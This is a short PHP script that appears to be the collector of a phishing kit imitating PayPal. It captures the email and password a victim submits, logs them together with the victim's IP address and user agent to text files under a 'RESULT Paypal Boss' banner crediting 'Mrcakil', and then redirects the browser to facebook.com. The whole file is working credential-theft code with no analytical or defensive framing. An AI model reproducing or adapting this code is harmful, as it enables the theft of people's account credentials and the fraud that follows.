<?php
$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$today = date("F j, Y, g:i a");
if (!empty($_POST["login_email"])){
		if (!empty($_POST["login_password"])){
			$buka=fopen("LOG-ACCOUNT.txt","a+");
			$tulis=fopen("RESULT.txt","w");
			fwrite($buka,"\n\r[+] RESULT Paypal Boss !\n\r[*] Poweered By Mrcakil\n\r[+] Emailnya: ".$_POST["login_email"]."\n[+] Passwordnya: ".$_POST["login_password"]."\n[+] Ip Address : $ip\n\r[+] User Agent : $user_agent");
			fwrite($tulis,"\r[+] RESULT \n\r[=] Email: ".$_POST["login_email"]."\n\r[=] Pasword: ".$_POST["login_password"]);
			fclose($buka);
			fclose($tulis);
echo '<!DOCTYPE html PUBLIC "-//WAPFORUM//DTD XHTML Mobile 1.2//EN" "http://www.openmobilealliance.or$<html xmlns="http://www.w3.org/1999/xhtml" lang="en"><head> <title>Mengalihkan halaman</title><meta http-equiv="Refresh" content="1; URL=http://facebook.com/"/></head><body></body></html>';
		}else{
			exit();
		}
	}else{
		exit();
	}
?>
